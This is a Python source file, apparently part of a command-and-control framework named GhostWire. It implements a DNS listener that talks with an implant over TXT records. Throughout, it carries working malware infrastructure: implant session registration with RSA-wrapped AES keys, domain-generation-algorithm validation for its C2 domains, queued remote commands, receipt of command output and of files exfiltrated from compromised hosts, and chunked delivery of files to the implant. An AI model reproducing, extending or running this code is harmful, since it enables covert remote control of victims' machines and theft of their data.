
"""
GhostWire DNS Listener
=======================
Pretends to be a DNS server. When the implant sends a DNS query,
this listener catches it, parses it, and sends back commands
embedded in DNS TXT records.
"""



import os
import base64
import threading
import time
from datetime import datetime, timezone

from dnslib import DNSRecord, QTYPE, RR, TXT
from dnslib.server import DNSServer, BaseResolver

from shared.protocol import (
    MSG_REGISTER, MSG_BEACON, MSG_DATA, MSG_CMDREQ,
    MSG_UPLOAD, MSG_DOWNLOAD, MSG_EXIT,
    RESP_ACK, RESP_CMD, RESP_NOOP, RESP_ERR,
    parse_query, EMPTY_DATA, KEY_END_MARKER, DATA_END_MARKER
)
from shared.config import (
    C2_DOMAINS, DGA_SEED, DGA_LENGTH, DGA_HOURS_BACK,
    DNS_LISTEN_IP, DNS_LISTEN_PORT, ENCRYPTION_ENABLED,
    RSA_PUB_FILE, RSA_PRIV_FILE, DB_PATH, LOG_FILE
)
from shared.dga import DGA
from shared.crypto import AESCipher, RSAKeyManager
from shared import database
from shared.logger import log_info, log_warning, log_error


class GhostWireSession:
    """Tracks a single implant connection, including its AES key."""

    def __init__(self, session_id, ip_address, aes_key=None):
        self.session_id = session_id
        self.ip_address = ip_address
        self.last_beacon = datetime.now(timezone.utc)
        self.commands = []
        self.command_ids = []      # Track DB IDs for commands
        self.results = []
        self.key_buffer = []
        self.data_buffer_list = []
        self.aes_key = aes_key
        self.aes = AESCipher(aes_key) if aes_key else None

        # File transfer state
        self.upload_buffer = []
        self.upload_filename = None
        self.download_chunks = []
        self.download_filename = None

    def add_command(self, command, command_id=None):
        self.commands.append(command)
        self.command_ids.append(command_id)

    def get_next_command(self):
        if self.commands:
            cmd_id = self.command_ids.pop(0) if self.command_ids else None
            return self.commands.pop(0), cmd_id
        return None, None

    def add_result(self, data):
        self.results.append(data)

    def update_beacon(self):
        self.last_beacon = datetime.now(timezone.utc)

    def set_aes_key(self, aes_key):
        self.aes_key = aes_key
        self.aes = AESCipher(aes_key)

    def encrypt(self, plaintext):
        if self.aes and ENCRYPTION_ENABLED:
            return self.aes.encrypt(plaintext)
        return plaintext

    def decrypt(self, ciphertext):
        if self.aes and ENCRYPTION_ENABLED:
            return self.aes.decrypt(ciphertext)
        return ciphertext


class GhostWireResolver(BaseResolver):
    """The brain of the DNS listener. Handles encrypted C2 traffic."""

    def __init__(self):
        self.dga = DGA(seed=DGA_SEED, length=DGA_LENGTH, domain=C2_DOMAINS[0], backup_domains=C2_DOMAINS[1:])
        self.sessions = {}

        # Initialize database
        print(f"[*] Initializing database: {DB_PATH}")
        database.init_db(DB_PATH)

        # Load RSA keys
        print(f"[*] Loading RSA keys...")
        self.rsa_private = RSAKeyManager.load_private_key(RSA_PRIV_FILE)
        self.rsa_public = RSAKeyManager.load_public_key(RSA_PUB_FILE)
        print(f"[+] RSA keys loaded")
        print(f"[*] Encryption: {'ENABLED' if ENCRYPTION_ENABLED else 'DISABLED'}")
        log_info(f"Database initialized: {DB_PATH}")
        log_info("RSA keys loaded successfully")
        log_info(f"Encryption: {'ENABLED' if ENCRYPTION_ENABLED else 'DISABLED'}")

    def _match_domain(self, qname):
        for domain in C2_DOMAINS:
            if domain in qname:
                return domain
        return None

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname).rstrip(".")

        matched_domain = self._match_domain(qname)
        if not matched_domain:
            return reply

        client_ip = handler.client_address[0]
        parsed = parse_query(qname, domain_suffix=matched_domain)

        session_id = parsed.get('session_id', 'unknown')
        msg_type = parsed.get('msg_type', '')
        dga_label = parsed.get('dga_label', '')
        encoded_data = parsed.get('encoded_data', '')
        chunk_num = parsed.get('chunk_num', 0)

        if dga_label and not self.dga.is_valid_label(dga_label, hours_back=DGA_HOURS_BACK):
            print(f"[!] REJECTED invalid DGA label from {client_ip}: {dga_label}")
            log_warning(f"Rejected invalid DGA label from {client_ip}: {dga_label}")
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(RESP_ERR), ttl=1))
            return reply

        domain_tag = f"[{matched_domain}]"

        if msg_type == MSG_REGISTER:
            response = self._handle_register(session_id, client_ip, encoded_data, domain_tag)
        elif msg_type == MSG_BEACON:
            response = self._handle_beacon(session_id, client_ip)
            print(f"[*] {domain_tag} BEACON from {session_id}")
            log_info(f"BEACON from {session_id} ({client_ip})")
        elif msg_type == MSG_CMDREQ:
            response = self._handle_cmdreq(session_id)
        elif msg_type == MSG_DATA:
            response = self._handle_data(session_id, encoded_data)
            print(f"[*] {domain_tag} DATA from {session_id}")
            log_info(f"DATA chunk received from {session_id}")
        elif msg_type == MSG_UPLOAD:
            response = self._handle_upload(session_id, encoded_data)
            print(f"[*] {domain_tag} UPLOAD from {session_id}")
            log_info(f"UPLOAD chunk received from {session_id}")
        elif msg_type == MSG_DOWNLOAD:
            response = self._handle_download(session_id, chunk_num)
        elif msg_type == MSG_EXIT:
            response = self._handle_exit(session_id)
        else:
            response = RESP_ERR
            log_warning(f"Unknown message type '{msg_type}' from {session_id}")

        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(response), ttl=1))
        return reply

    def _handle_register(self, session_id, client_ip, encoded_data, domain_tag):
        if encoded_data == KEY_END_MARKER:
            if session_id not in self.sessions:
                return RESP_ERR
            encrypted_key_b64 = "".join(self.sessions[session_id].key_buffer)
            if ENCRYPTION_ENABLED:
                try:
                    aes_key = RSAKeyManager.decrypt_key(encrypted_key_b64, self.rsa_private)
                    self.sessions[session_id].set_aes_key(aes_key)
                    print(f"[+] {session_id} AES key received and decrypted")
                    log_info(f"Session {session_id}: AES key decrypted successfully")
                except Exception as e:
                    print(f"[!] {session_id} Failed to decrypt AES key: {e}")
                    log_error(f"Session {session_id}: Failed to decrypt AES key: {e}")
                    return RESP_ERR
            print(f"[+] {domain_tag} SESSION REGISTERED: {session_id} from {client_ip}")

            # Save to database
            is_encrypted = self.sessions[session_id].aes is not None
            database.save_session(DB_PATH, session_id, client_ip, encrypted=is_encrypted)
            log_info(f"Session registered: {session_id} from {client_ip} (encrypted={is_encrypted})")

            return RESP_ACK

        if session_id not in self.sessions:
            self.sessions[session_id] = GhostWireSession(session_id, client_ip)
            log_info(f"New session created: {session_id} from {client_ip}")

        if ENCRYPTION_ENABLED and encoded_data and encoded_data != EMPTY_DATA:
            self.sessions[session_id].key_buffer.append(encoded_data)
            print(f"[+] {session_id} Key chunk {len(self.sessions[session_id].key_buffer)-1} buffered")
            log_info(f"Session {session_id}: key chunk {len(self.sessions[session_id].key_buffer)-1} buffered")

        return RESP_ACK

    def _handle_beacon(self, session_id, client_ip):
        if session_id not in self.sessions:
            return RESP_ERR
        self.sessions[session_id].update_beacon()
        database.update_beacon(DB_PATH, session_id)
        log_info(f"Session {session_id}: beacon received and updated")
        if self.sessions[session_id].commands:
            log_info(f"Session {session_id}: command pending, sending CMD flag")
            return RESP_CMD
        return RESP_ACK

    def _handle_cmdreq(self, session_id):
        if session_id not in self.sessions:
            return RESP_ERR
        command, command_id = self.sessions[session_id].get_next_command()
        if command:
            response_text = f"CMD:{command}"
            print(f"[>] SENDING encrypted command to {session_id}: {command}")

            # Update DB: command sent
            if command_id:
                database.update_command_sent(DB_PATH, command_id)

            if ENCRYPTION_ENABLED and self.sessions[session_id].aes:
                try:
                    encrypted_response = self.sessions[session_id].encrypt(response_text)
                    log_info(f"Session {session_id}: encrypted command sent: {command}")
                    return encrypted_response
                except Exception as e:
                    print(f"[!] Failed to encrypt response: {e}")
                    log_error(f"Session {session_id}: failed to encrypt command response: {e}")
                    return RESP_ERR
            log_info(f"Session {session_id}: unencrypted command sent: {command}")
            return response_text
        log_info(f"Session {session_id}: no commands available, sending NOOP")
        return RESP_NOOP

    def _handle_data(self, session_id, encoded_data):
        if session_id not in self.sessions:
            return RESP_ERR
        self.sessions[session_id].update_beacon()

        if encoded_data == DATA_END_MARKER:
            encrypted_data = "".join(self.sessions[session_id].data_buffer_list)
            self.sessions[session_id].data_buffer_list = []
            if ENCRYPTION_ENABLED and self.sessions[session_id].aes:
                try:
                    decrypted_data = self.sessions[session_id].decrypt(encrypted_data)
                    self.sessions[session_id].add_result(decrypted_data)
                    print(f"[<] RECEIVED decrypted data from {session_id}: {decrypted_data[:50]}")

                    # Save to database
                    database.save_result(DB_PATH, session_id, decrypted_data, result_type='command')
                    log_info(f"Session {session_id}: received result ({len(decrypted_data)} chars)")

                except Exception as e:
                    print(f"[!] Failed to decrypt data from {session_id}: {e}")
                    log_error(f"Session {session_id}: failed to decrypt data: {e}")
                    return RESP_ERR
            else:
                self.sessions[session_id].add_result(encrypted_data)
                print(f"[<] RECEIVED data from {session_id}: {encrypted_data[:50]}")
                database.save_result(DB_PATH, session_id, encrypted_data, result_type='command')
                log_info(f"Session {session_id}: received unencrypted result ({len(encrypted_data)} chars)")
            return RESP_ACK

        if encoded_data and encoded_data != EMPTY_DATA:
            if ENCRYPTION_ENABLED and self.sessions[session_id].aes:
                self.sessions[session_id].data_buffer_list.append(encoded_data)
                print(f"[+] {session_id} Data chunk buffered ({len(self.sessions[session_id].data_buffer_list)} total)")
                log_info(f"Session {session_id}: data chunk buffered, total {len(self.sessions[session_id].data_buffer_list)}")
            else:
                self.sessions[session_id].add_result(encoded_data)
                print(f"[<] RECEIVED data from {session_id}: {encoded_data[:50]}")
                log_info(f"Session {session_id}: received unencrypted data chunk")

        return RESP_ACK

    def _handle_upload(self, session_id, encoded_data):
        if session_id not in self.sessions:
            return RESP_ERR
        self.sessions[session_id].update_beacon()

        if encoded_data == DATA_END_MARKER:
            encrypted_data = "".join(self.sessions[session_id].upload_buffer)
            self.sessions[session_id].upload_buffer = []

            if ENCRYPTION_ENABLED and self.sessions[session_id].aes:
                try:
                    decrypted_b64 = self.sessions[session_id].decrypt(encrypted_data)
                    file_data = base64.b64decode(decrypted_b64)
                except Exception as e:
                    print(f"[!] Failed to decrypt upload from {session_id}: {e}")
                    log_error(f"Session {session_id}: failed to decrypt upload: {e}")
                    return RESP_ERR
            else:
                try:
                    file_data = base64.b64decode(encrypted_data)
                except Exception:
                    file_data = encrypted_data.encode()

            filename = self.sessions[session_id].upload_filename or "unknown"
            safe_filename = os.path.basename(filename).replace("/", "_")


            upload_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "uploads")
            os.makedirs(upload_dir, exist_ok=True)
            save_path = os.path.join(upload_dir, f"{session_id}_{safe_filename}")

            try:
                with open(save_path, 'wb') as f:
                    f.write(file_data)
                print(f"[+] Saved uploaded file: {save_path} ({len(file_data)} bytes)")
                self.sessions[session_id].add_result(f"[UPLOAD] {filename} → saved ({len(file_data)} bytes)")

                # Save to database
                database.save_result(DB_PATH, session_id, f"[UPLOAD] {filename} → {save_path} ({len(file_data)} bytes)", result_type='upload')
                log_info(f"Session {session_id}: uploaded file saved: {save_path} ({len(file_data)} bytes)")

            except Exception as e:
                print(f"[!] Failed to save upload: {e}")
                log_error(f"Session {session_id}: failed to save upload: {e}")
                return RESP_ERR

            self.sessions[session_id].upload_filename = None
            return RESP_ACK

        if encoded_data and encoded_data != EMPTY_DATA:
            self.sessions[session_id].upload_buffer.append(encoded_data)
            print(f"[+] {session_id} Upload chunk buffered ({len(self.sessions[session_id].upload_buffer)} total)")
            log_info(f"Session {session_id}: upload chunk buffered, total {len(self.sessions[session_id].upload_buffer)}")

        return RESP_ACK

    def _handle_download(self, session_id, chunk_num):
        if session_id not in self.sessions:
            return RESP_ERR
        session = self.sessions[session_id]

        if not session.download_chunks:
            print(f"[>] {session_id} Download complete (no more chunks)")
            log_warning(f"Session {session_id}: download requested but no chunks available")
            session.download_filename = None
            return "DONE"

        chunk_idx = int(chunk_num) if isinstance(chunk_num, str) else chunk_num

        if chunk_idx < len(session.download_chunks):
            chunk = session.download_chunks[chunk_idx]
            print(f"[>] {session_id} Download chunk {chunk_idx}/{len(session.download_chunks)-1}")
            log_info(f"Session {session_id}: download chunk {chunk_idx} sent")
            return chunk
        else:
            print(f"[+] {session_id} Download complete ({len(session.download_chunks)} chunks sent)")

            # Save to database
            if session.download_filename:
                database.save_result(DB_PATH, session_id, f"[DOWNLOAD] → {session.download_filename}", result_type='download')
                log_info(f"Session {session_id}: download complete for {session.download_filename} ({len(session.download_chunks)} chunks)")

            session.download_chunks = []
            session.download_filename = None
            return "DONE"

    def _handle_exit(self, session_id):
        if session_id in self.sessions:
            print(f"[-] SESSION CLOSED: {session_id}")
            log_info(f"Session {session_id}: exited, session closed")
            database.close_session(DB_PATH, session_id)
            del self.sessions[session_id]
        return RESP_ACK

    def queue_command(self, session_id, command):
        if session_id in self.sessions:
            command_id = database.save_command(DB_PATH, session_id, command)
            self.sessions[session_id].add_command(command, command_id)
            print(f"[+] QUEUED command for {session_id}: {command}")
            log_info(f"Operator queued command for {session_id}: {command}")
            return True
        else:
            print(f"[!] Unknown session: {session_id}")
            log_warning(f"queue_command failed: unknown session {session_id}")
            return False

    def queue_upload(self, session_id, filepath):
        if session_id not in self.sessions:
            print(f"[!] Unknown session: {session_id}")
            log_warning(f"queue_upload failed: unknown session {session_id}")
            return False
        self.sessions[session_id].upload_filename = filepath
        command_id = database.save_command(DB_PATH, session_id, f"UPLOAD:{filepath}")
        self.sessions[session_id].add_command(f"UPLOAD:{filepath}", command_id)
        print(f"[+] QUEUED upload for {session_id}: {filepath}")
        log_info(f"Operator queued upload for {session_id}: {filepath}")
        return True

    def queue_download(self, session_id, local_filepath, remote_filepath):
        if session_id not in self.sessions:
            print(f"[!] Unknown session: {session_id}")
            log_warning(f"queue_download failed: unknown session {session_id}")
            return False
        try:
            with open(local_filepath, 'rb') as f:
                file_data = f.read()
        except Exception as e:
            print(f"[!] Failed to read file {local_filepath}: {e}")
            log_error(f"Failed to read file {local_filepath} for download: {e}")
            return False

        file_b64 = base64.b64encode(file_data).decode()

        if self.sessions[session_id].aes and ENCRYPTION_ENABLED:
            encrypted = self.sessions[session_id].encrypt(file_b64)
        else:
            encrypted = file_b64

        chunk_size = 60
        chunks = [encrypted[i:i+chunk_size] for i in range(0, len(encrypted), chunk_size)]

        self.sessions[session_id].download_chunks = chunks
        self.sessions[session_id].download_filename = remote_filepath

        command_id = database.save_command(DB_PATH, session_id, f"DOWNLOAD:{remote_filepath}")
        self.sessions[session_id].add_command(f"DOWNLOAD:{remote_filepath}", command_id)
        print(f"[+] QUEUED download for {session_id}: {local_filepath} → {remote_filepath} ({len(file_data)} bytes, {len(chunks)} chunks)")
        log_info(f"Operator queued download for {session_id}: {local_filepath} → {remote_filepath} ({len(file_data)} bytes, {len(chunks)} chunks)")
        return True

    def list_sessions(self):
        session_list = []
        for sid, session in self.sessions.items():
            session_list.append({
                'id': sid,
                'ip': session.ip_address,
                'last_beacon': session.last_beacon.strftime("%H:%M:%S"),
                'pending_cmds': len(session.commands),
                'results': len(session.results),
                'encrypted': session.aes is not None
            })
        return session_list


class DNSListener:
    def __init__(self):
        self.resolver = GhostWireResolver()
        self.server = None
        self.thread = None

    def start(self):
        print(f"[*] Starting DNS listener on {DNS_LISTEN_IP}:{DNS_LISTEN_PORT}")
        print(f"[*] Primary C2:     {C2_DOMAINS[0]}")
        print(f"[*] Backup C2 1:    {C2_DOMAINS[1]}")
        print(f"[*] Backup C2 2:    {C2_DOMAINS[2]}")
        print(f"[*] DGA Seed:       {DGA_SEED}")
        print(f"[*] Encryption:     {'ENABLED (AES-256 + RSA-2048)' if ENCRYPTION_ENABLED else 'DISABLED'}")
        print(f"[*] Database:       {DB_PATH}")
        print(f"[*] Log file:       {LOG_FILE}")
        print(f"[*] Current DGA domains:")
        for domain in self.resolver.dga.generate_all():
            print(f"[*]   → {domain}")

        log_info(f"DNS listener starting on {DNS_LISTEN_IP}:{DNS_LISTEN_PORT}")
        log_info(f"Primary C2: {C2_DOMAINS[0]}, Backups: {C2_DOMAINS[1]}, {C2_DOMAINS[2]}")

        self.server = DNSServer(
            self.resolver,
            port=DNS_LISTEN_PORT,
            address=DNS_LISTEN_IP
        )
        self.thread = threading.Thread(target=self.server.start_thread)
        self.thread.daemon = True
        self.thread.start()

        print(f"\n[+] DNS listener is running!")
        print(f"[+] Waiting for implant connections...\n")
        log_info("DNS listener started successfully")

    def stop(self):
        if self.server:
            self.server.stop()
            print("[*] DNS listener is stopped..")
            log_info("DNS listener stopped")

    def get_resolver(self):
        return self.resolver